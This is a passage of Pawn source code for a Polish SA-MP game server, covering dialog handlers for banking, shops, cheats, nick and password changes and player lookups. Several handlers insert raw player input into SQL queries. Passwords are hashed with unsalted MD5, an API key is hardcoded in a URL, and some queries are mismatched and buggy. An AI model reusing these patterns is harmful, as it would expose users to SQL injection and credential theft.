  						new s[1024];
						format(s, 1024, ""C_WHITE"Wpisz poni¿ej iloœæ EXP, jak¹ chcesz wp³aciæ do banku.");
    					return ShowPlayerDialog(playerid, DIALOG_BANK1, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Wp³aæ", "Zamknij"); }
			        case 1: {
  						new s[1024];
						format(s, 1024, ""C_WHITE"Wpisz poni¿ej iloœæ EXP, jak¹ chcesz wyp³aciæ do banku.");
    					return ShowPlayerDialog(playerid, DIALOG_BANK2, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Wyp³aæ", "Zamknij"); }
			        case 2: {
  						new s[1024];
						format(s, 1024, ""C_WHITE"Twój stan konta bankowego wynosi "C_LOLIVE"%d "C_WHITE"EXP.", Player[playerid][Bank]);
    					return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Zamknij", ""); }
			        case 3: {
  						new s[1024];
						format(s, 1024, ""C_WHITE"Wpisz poni¿ej iloœæ gotówki, jak¹ chcesz wp³aciæ do banku.");
    					return ShowPlayerDialog(playerid, DIALOG_BANK3, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Wp³aæ", "Zamknij"); }
			        case 4: {
  						new s[1024];
						format(s, 1024, ""C_WHITE"Wpisz poni¿ej iloœæ gotówki, jak¹ chcesz wyp³aciæ do banku.");
    					return ShowPlayerDialog(playerid, DIALOG_BANK4, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Wyp³aæ", "Zamknij"); }
			        case 5: {
  						new s[1024];
						format(s, 1024, ""C_WHITE"Twój stan konta bankowego wynosi "C_LOLIVE"%d "C_WHITE"$.", Player[playerid][BankC]);
    					return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_GREEN"Bank", s, "Zamknij", ""); }
			    }
			}
		}
		case DIALOG_BANK1:
		{
			if(!response) return 1;
			if(response)
			{
				if(!IsNumeric(inputtext)) return 1;
				new exp = strval(inputtext);
				if(Player[playerid][Exp] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ EXP.");
				Player[playerid][Exp] -= exp;
				Player[playerid][Bank] += exp;
				SaveAllData(playerid);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP wp³acony.");
			}
		}
		case DIALOG_BANK2:
		{
			if(!response) return 1;
			if(response)
			{
				if(!IsNumeric(inputtext)) return 1;
				new exp = strval(inputtext);
				if(Player[playerid][Bank] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ EXP.");
				Player[playerid][Bank] -= exp;
				AddExp(playerid, exp);
				SaveAllData(playerid);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP wyp³acony.");
			}
		}
		case DIALOG_BANK3:
		{
			if(!response) return 1;
			if(response)
			{
				if(!IsNumeric(inputtext)) return 1;
				new exp = strval(inputtext);
				if(Player[playerid][Cash] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ gotówki.");
				Player[playerid][Cash] -= exp;
				Player[playerid][BankC] += exp;
				SaveAllData(playerid);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Gotówka wp³acona.");
			}
		}
		case DIALOG_BANK4:
		{
			if(!response) return 1;
			if(response)
			{
				if(!IsNumeric(inputtext)) return 1;
				new exp = strval(inputtext);
				if(Player[playerid][BankC] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ gotówki.");
				Player[playerid][BankC] -= exp;
				Player[playerid][Cash] += exp;
				SaveAllData(playerid);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Gotówka wyp³acona.");
			}
		}
		case DIALOG_CHEATS:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
					case 0: {
					    Opcja[playerid] = 1;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 1: {
					    Opcja[playerid] = 2;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 2: {
					    Opcja[playerid] = 3;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 3: {
					    Opcja[playerid] = 4;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 4: {
					    Opcja[playerid] = 5;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 5: {
					    Opcja[playerid] = 6;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 6: {
					    Opcja[playerid] = 7;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 7: {
					    Opcja[playerid] = 8;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 8: {
					    Opcja[playerid] = 9;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 9: {
					    Opcja[playerid] = 10;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klakson"C_LOLIVE", aby u¿yæ."); }
					case 10: {
					    Opcja[playerid] = 11;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty w³¹czone. Naciœnij "C_WHITE"klawisz skoku"C_LOLIVE", aby u¿yæ."); }
					case 11: {
					    Opcja[playerid] = 0;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Cheaty wy³¹czone."); }
		        }
		    }
		}
		case DIALOG_LASER:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
					case 0:
					{
					    if(GetPVarInt(playerid, "laser") == 0) return DialogError(playerid, "{FFFF00}Nie posiadasz w³¹czonego ¿adnego lasera.");
						else
						{
                			SetPVarInt(playerid, "laser", 0);
                			RemovePlayerAttachedObject(playerid, 3);
                			return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Laser wy³¹czony.");
						}
					}
					case 1: {
					    SetPVarInt(playerid, "color", 18643);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
					case 2: {
					    SetPVarInt(playerid, "color", 19080);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
					case 3: {
					    SetPVarInt(playerid, "color", 19081);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
					case 4: {
					    SetPVarInt(playerid, "color", 19082);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
					case 5: {
					    SetPVarInt(playerid, "color", 19083);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
					case 6: {
					    SetPVarInt(playerid, "color", 19084);
					    SetPVarInt(playerid, "laser", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolor lasera zmieniony."); }
		        }
		    }
		}
	    case DIALOG_IS:
	    {
			if(!response) return 1;
	        if(response)
	        {
	            switch(listitem)
	            {
	                case 0:
	                {
						if(Player[playerid][Exp] < 100) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tego przedmiotu.");
						Player[playerid][Exp] -= 100;
						AddItem(playerid, "{FF0400}Catching "C_WHITE"Tool", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Przedmiot zosta³ zakupiony.");
					}
	                case 1:
	                {
						if(Player[playerid][Exp] < 150) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tego przedmiotu.");
						Player[playerid][Exp] -= 150;
						AddItem(playerid,"{68A028}Kanister paliwa", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Przedmiot zosta³ zakupiony.");
					}
	                case 2:
	                {
						if(Player[playerid][Exp] < 30) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tego przedmiotu.");
						Player[playerid][Exp] -= 30;
						AddItem(playerid, "{AFAFAF}Bomba", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Przedmiot zosta³ zakupiony.");
					}
	                case 3:
	                {
						if(Player[playerid][Exp] < 25) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tego przedmiotu.");
						Player[playerid][Exp] -= 25;
						AddItem(playerid, ""C_GREEN"Nasiona", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Przedmiot zosta³ zakupiony.");
					}
	                case 4:
	                {
						if(Player[playerid][Exp] < 200) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tego przedmiotu.");
						Player[playerid][Exp] -= 200;
						AddItem(playerid, "{AE00FF}Narkotyk", 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Przedmiot zosta³ zakupiony.");
					}
				}
			}
			return 1;
		}
	    case DIALOG_BRONIE:
	    {
			if(!response) return 1;
	        if(response)
	        {
	            switch(listitem)
	            {
	                case 0:
	                {
						if(Player[playerid][Exp] < 2) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 2;
						GivePlayerWeapon(playerid, 4, 1);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 1:
	                {
						if(Player[playerid][Exp] < 3) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 3;
						GivePlayerWeapon(playerid, 22, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 2:
	                {
						if(Player[playerid][Exp] < 4) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 4;
						GivePlayerWeapon(playerid, 23, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 3:
	                {
						if(Player[playerid][Exp] < 7) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 7;
						GivePlayerWeapon(playerid, 24, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 4:
	                {
						if(Player[playerid][Exp] < 7) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 7;
						GivePlayerWeapon(playerid, 25, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 5:
	                {
						if(Player[playerid][Exp] < 10) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 10;
						GivePlayerWeapon(playerid, 29, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 6:
	                {
						if(Player[playerid][Exp] < 15) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 15;
						GivePlayerWeapon(playerid, 30, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 7:
	                {
						if(Player[playerid][Exp] < 20) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 20;
						GivePlayerWeapon(playerid, 31, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 8:
	                {
						if(Player[playerid][Exp] < 25) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 25;
						GivePlayerWeapon(playerid, 34, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 9:
	                {
						if(Player[playerid][Exp] < 100) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 100;
						GivePlayerWeapon(playerid, 26, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 10:
	                {
						if(Player[playerid][Exp] < 100) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 100;
						GivePlayerWeapon(playerid, 27, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 11:
	                {
						if(Player[playerid][Exp] < 150) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 150;
						GivePlayerWeapon(playerid, 32, 9989);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
	                case 12:
	                {
						if(Player[playerid][Exp] < 250) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na kupno tej broni.");
						Player[playerid][Exp] -= 250;
						GivePlayerWeapon(playerid, 16, 15);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Broñ zosta³a zakupiona.");
					}
				}
			}
			return 1;
		}
		case DIALOG_DO: 
		{
		    if (!response) return 1;
		    if (strlen(inputtext) <= 1) return 1;
 			new msgs[256];
   			format(msgs, sizeof(msgs), ""C_ORANGE"* "C_WHITE"%s "C_ORANGE"%s"C_WHITE".", Player[playerid][Name], inputtext);
			SendClientMessageToAll(-1, msgs);
		}
		case DIALOG_BOMBA:
		{
			if(!ZnajdzkaActive) return 1;
			ZnajdzkaType = -1;
			if(!response)
			{
			    ZnajdzkaActive = false;
   		   		Loop(loopid, MAX_PLAYERS) {
					if(TDOn[loopid] && IsPlayerConnected(loopid)) {
					TextDrawHideForPlayer(loopid, Textdraw[18]);
					TextDrawHideForPlayer(loopid, Textdraw[19]); } }
				switch(random(2))
				{
			    	case 0:
			    	{
			    		DestroyDynamicPickup(BombaPickup);
			    		KillTimer(BombaTimer);
						new exp = random(100);
						new imsg[256];
						format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {FF6B6B}rozbroi³ bombê i otrzymuje "C_WHITE"%d {FF6B6B}EXP!", Player[playerid][Name], playerid, exp);
						AddExp(playerid, exp);
						return SendClientMessageToAll(-1, imsg);
			    	}
			    	case 1:
			    	{
			        	BombaDestroy();
						new imsg[256];
						format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {FF6B6B}znalaz³ bombê, lecz nie uda³o mu siê jej rozbroiæ.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, imsg);
			    	}
				}
			}
			if(response)
			{
			    ZnajdzkaActive = false;
				switch(random(2))
				{
			    	case 0:
			    	{
			    		DestroyDynamicPickup(BombaPickup);
			    		KillTimer(BombaTimer);
						new exp = random(100);
						new imsg[256];
						format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {FF6B6B}rozbroi³ bombê i otrzymuje "C_WHITE"%d {FF6B6B}EXP!", Player[playerid][Name], playerid, exp);
						AddExp(playerid, exp);
						return SendClientMessageToAll(-1, imsg);
			    	}
			    	case 1:
			    	{
			        	BombaDestroy();
						new imsg[256];
						format(imsg, sizeof(imsg), ""C_NICK"%s(%d) {FF6B6B}znalaz³ bombê, lecz nie uda³o mu siê jej rozbroiæ.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, imsg);
			    	}
				}
			}
		}
		case DIALOG_PASSCHANGE:
		{
		    if (!response) return 1;
			if (response)
			{
				if (strlen(inputtext) <= 8 || strlen(inputtext) >= 32) return DialogError(playerid, "{FFFF00}Twoje has³o powinno mieœciæ siê w przedziale 9-32 znaków.");
				mysql_real_escape_string(inputtext, inputtext);
				format(Player[playerid][Password], 65, "%s", MD5_Hash(inputtext));
				m_query("UPDATE players SET pass = '%s' WHERE id = %d", Player[playerid][Password], Player[playerid][ID]);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Has³o zmienione pomyœlnie.");
			}
		}
		case DIALOG_NICKCHANGE:
		{
		    if (!response) return 1;
			if (response)
			{
				if (strlen(inputtext) <= 3 || strlen(inputtext) >= 20) return DialogError(playerid, "{FFFF00}Nieprawid³owa d³ugoœæ nicku.");
				mysql_real_escape_string(inputtext, inputtext);
				m_query("SELECT * FROM players WHERE username = '%s'", inputtext);
				mysql_store_result();
				if(mysql_num_rows() > 0) {
					mysql_free_result();
					return DialogError(playerid, "{FFFF00}Podany nick jest zajêty."); }
				mysql_free_result();
				Player[playerid][Exp] -= 500;
				Loop(domy, MAX_HOUSES)
				{
					if(CompareEx(HouseInfo[domy][OwnerName], Player[playerid][Name])) {
						format(HouseInfo[domy][OwnerName], 20, "%s", inputtext);
						UpdateHouseLabel(domy); }
				}
				format(Player[playerid][Name], 20, "%s", inputtext);
				SetPlayerName(playerid, Player[playerid][Name]);
				m_query("UPDATE players SET name = '%s' WHERE id = %d", inputtext, Player[playerid][Name]);
				Player[playerid][NickChange] = gettime() + 86400;
				Loop(privcarid, privcars) if(pOwner[privcarid] == Player[playerid][ID]) format(pOwnerN[privcarid], 20, "%s", inputtext);
				SaveAllData(playerid);
 				new tdstrr[256];
 				format(tdstrr, sizeof(tdstrr), "%d ~w~~h~%s", playerid, Player[playerid][Name]);
				PlayerTextDrawSetString(playerid, Nick[playerid], tdstrr);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Nick zmieniony pomyœlnie.");
			}
		}
        case DIALOG_SMS:
        {
			if(!response) return 1;
            if(response)
            {
                new s[180];
                format(s, 180, "http://admin.serverproject.eu/api/smsapi.php?key=7473b1339f3ed2d9e46b10a3a&amount=6&code=%s&desc=%s", inputtext, Player[playerid][Name]);
				return HTTP(playerid, HTTP_GET, s, "", "CheckCODE");
            }
        }
        case DIALOG_EMAIL:
        {
			if(!response) return 1;
      if(strlen(inputtext) > 40 || strlen(inputtext) < 4) return SendClientMessage(playerid, RED, "Zbyt d³ugi lub zbyt krótki adres e-mail.");
            if(response) {
                format(Player[playerid][Email], 40, "%s", inputtext);
                SaveAllData(playerid);
                return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Adres e-mail przypisany do Twojego konta."); }
        }
        case DIALOG_PLAYER:
        {
            if (!response) return 1;
            new sql[1024], s[1024], uid, name[20];
			m_query("SELECT id, username FROM players WHERE username REGEXP '%s' ORDER BY id ASC", inputtext);
			mysql_store_result();
			new tickety = mysql_num_rows();
			if(tickety == 0) return DialogError(playerid, "{FFFF00}Wyszukiwanie nie zwróci³o ¿adnego wyniku.");
			if(tickety > 15) return DialogError(playerid, "{FFFF00}Wyszukiwanie zwróci³o zbyt du¿o wyników.");
			while(mysql_fetch_row(sql))
			{
				sscanf(sql, "p<|>is[1024]", uid, sql);
				sscanf(sql, "p<|>s[20]", name);
				format(s, sizeof(s), "%s"C_BLUE1"%d"C_WHITE". %s\n", s, uid, name);
			}
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_RESPONSE_PLAYER, DIALOG_STYLE_LIST, ""C_BLUE1"Wyszukiwanie graczy", s, "Wybierz", "Zamknij");
        }
        case DIALOG_PLAYERP:
        {
            if (!response) return 1;
	     	if(!IsNumeric(inputtext)) return SendClientMessage(playerid, RED, "Graczy wed³ug pojazdu nale¿y wyszukiwaæ wed³ug ID modelu pojazdu.");
            new sql[1024], s[1024], uid, name[20];
			m_query("SELECT ownerid, ownername FROM privcars WHERE modelid = %d ORDER BY ownerid ASC", strval(inputtext));
			mysql_store_result();
			new tickety = mysql_num_rows();
			if(tickety == 0) return DialogError(playerid, "{FFFF00}Wyszukiwanie nie zwróci³o ¿adnego wyniku.");
			if(tickety > 15) return DialogError(playerid, "{FFFF00}Wyszukiwanie zwróci³o zbyt du¿o wyników.");
			while(mysql_fetch_row(sql))
			{
				sscanf(sql, "p<|>is[1024]", uid, sql);
				sscanf(sql, "p<|>s[20]", name);
				format(s, sizeof(s), "%s"C_BLUE1"%d"C_WHITE". %s\n", s, uid, name);
			}
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_RESPONSE_PLAYERP, DIALOG_STYLE_LIST, ""C_BLUE1"Wyszukiwanie graczy", s, "Wybierz", "Zamknij");
        }
        case DIALOG_PLAYERIP:
        {
            if (!response) return 1;
            new sql[1024], s[1024], uid, name[20], ip[16];
			m_query("SELECT id, username, ip FROM players WHERE ip REGEXP '%s' ORDER BY id ASC", inputtext);
			mysql_store_result();
			new tickety = mysql_num_rows();
			if(tickety == 0) return DialogError(playerid, "{FFFF00}Wyszukiwanie nie zwróci³o ¿adnego wyniku.");
			if(tickety > 15) return DialogError(playerid, "{FFFF00}Wyszukiwanie zwróci³o zbyt du¿o wyników.");
			while(mysql_fetch_row(sql))
			{
				sscanf(sql, "p<|>is[1024]", uid, sql);
				sscanf(sql, "p<|>s[20]s[16]", name);
				format(s, sizeof(s), "%s"C_BLUE1"%d"C_WHITE". %s\t%s\n", s, uid, name, ip);
			}
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_RESPONSE_PLAYERIP, DIALOG_STYLE_LIST, ""C_BLUE1"Wyszukiwanie graczy", s, "Wybierz", "Zamknij");
        }
        case DIALOG_RESPONSE_PLAYER:
        {
            if (!response) return 1;
			new choosedid, _s[4];
			strmid(_s, inputtext, 0, strfind(inputtext, "."));
			choosedid = strval(_s);
			new nickstr[128], statsstr[4096], sqlquery[1024], sqlquery2[1024];
			new id, user[20], kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[8], czat, solo, potwory, zabawy, visits, cbug, questy, house;
			m_query("SELECT id, username, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a1, a2, a3, a4, a5, a6, a7, czat, solo, potwory, zabawy, cbug, questy, house FROM players WHERE id = %d", choosedid);
			mysql_store_result();
			mysql_fetch_row(sqlquery, " ");
			mysql_free_result();
			sscanf(sqlquery, "is[20]iiiiiiiiiiiiiiiiiiiiiiifii", id, user, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], czat, solo, potwory, zabawy, visits, cbug, questy, house);
			format(nickstr, sizeof(nickstr), ""C_BLUE1"%s "C_WHITE"("C_BLUE1"UID %d"C_WHITE")", user, id);
			format(statsstr, sizeof(statsstr), ""C_WHITE"%d "C_BLUE1"EXP ("C_WHITE"%d"C_BLUE1"), "C_WHITE"%d"C_BLUE1"$\n", exp, level, waluta);
			if(vip > gettime()) format(statsstr, sizeof(statsstr), "%s"C_YELLOW"Posiada uprawnienia VIP\n", statsstr);
			if(rank == 0 && vip < gettime()) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "C_WHITE"Gracz\n", statsstr);
			if(rank == 1) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "JUNIOR"\n\n", statsstr);
			if(rank == 2) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "ADMIN"\n\n", statsstr);
			if(rank == 3) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "VHA"\n\n", statsstr);
			if(rank == 4) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "HA"\n\n", statsstr);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa/Zgony: "C_WHITE"%d/%d\n", statsstr, kills, deaths);
			format(statsstr, sizeof(statsstr), "%s{FF2600}Poziom ostrze¿eñ: %d{E50000}/{FF2600}100\n\n", statsstr, warny);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ogólny czas gry: "C_WHITE"%d"C_BLUE1"h "C_WHITE"%d"C_BLUE1"m\n", statsstr, hours, minutes);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wizyty na serwerze: "C_WHITE"%d\n\n", statsstr, visits);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ukoñczone wyzwania Reflex: "C_WHITE"%d\n", statsstr, czat);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane zabawy: "C_WHITE"%d\n", statsstr, zabawy);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa na arenach: "C_WHITE"%d, %d, %d, %d, %d, %d, %d, %d\n", statsstr, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane walki solo: "C_WHITE"%d\n", statsstr, solo);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Najszybszy czas glitch: "C_WHITE"%0.4fs\n\n", statsstr, cbug);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Z³apane potwory: "C_WHITE"%d\n", statsstr, potwory);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wykonane questy: "C_WHITE"%d\n\n", statsstr, questy);
			if(house > -1) format(statsstr, sizeof(statsstr), "%s"C_GREEN"Posiada dom o ID "C_WHITE"%d"C_GREEN".\n", statsstr, house);
			m_query("SELECT modelid, dist FROM privcars WHERE ownerid = %d", choosedid);
			mysql_store_result();
			if(mysql_num_rows() > 0) {
				mysql_fetch_row(sqlquery2, " ");
				mysql_free_result();
				new model, Float:distance;
				sscanf(sqlquery2, "if", model, distance);
				format(statsstr, sizeof(statsstr), "%s{CD82F5}Posiada prywatny pojazd "C_NICK"%s "C_YELLOW"(%.1fkm)\n\n", statsstr, VehicleNames[model - 400], distance); }
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, nickstr, statsstr, "Zamknij", "");
        }
        case DIALOG_RESPONSE_PLAYERP:
        {
            if (!response) return 1;
			new choosedid, _s[4];
			strmid(_s, inputtext, 0, strfind(inputtext, "."));
			choosedid = strval(_s);
			new nickstr[128], statsstr[4096], sqlquery[1024], sqlquery2[1024];
			new id, user[20], kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[8], czat, solo, potwory, zabawy, visits, cbug, questy, house;
			m_query("SELECT id, username, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a1, a2, a3, a4, a5, a6, a7, a8, czat, solo, potwory, zabawy, visits, cbug, questy, house FROM players WHERE id = %d", choosedid);
			mysql_store_result();
			mysql_fetch_row(sqlquery, " ");
			mysql_free_result();
			sscanf(sqlquery, "is[20]iiiiiiiiiiiiiiiiiiiiiiifii", id, user, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], czat, solo, potwory, zabawy, visits, cbug, questy, house);
			format(nickstr, sizeof(nickstr), ""C_BLUE1"%s "C_WHITE"("C_BLUE1"UID %d"C_WHITE")", user, id);
			format(statsstr, sizeof(statsstr), ""C_WHITE"%d "C_BLUE1"EXP ("C_WHITE"%d"C_BLUE1"), "C_WHITE"%d"C_BLUE1"$\n", exp, level, waluta);
			if(vip > gettime()) format(statsstr, sizeof(statsstr), "%s"C_YELLOW"Posiada uprawnienia VIP\n", statsstr);
			if(rank == 0 && vip < gettime()) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "C_WHITE"Gracz\n", statsstr);
			if(rank == 1) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "JUNIOR"\n\n", statsstr);
			if(rank == 2) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "ADMIN"\n\n", statsstr);
			if(rank == 3) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "VHA"\n\n", statsstr);
			if(rank == 4) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "HA"\n\n", statsstr);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa/Zgony: "C_WHITE"%d/%d\n", statsstr, kills, deaths);
			format(statsstr, sizeof(statsstr), "%s{FF2600}Poziom ostrze¿eñ: %d{E50000}/{FF2600}100\n\n", statsstr, warny);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ogólny czas gry: "C_WHITE"%d"C_BLUE1"h "C_WHITE"%d"C_BLUE1"m\n", statsstr, hours, minutes);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wizyty na serwerze: "C_WHITE"%d\n\n", statsstr, visits);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ukoñczone wyzwania Reflex: "C_WHITE"%d\n", statsstr, czat);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane zabawy: "C_WHITE"%d\n", statsstr, zabawy);
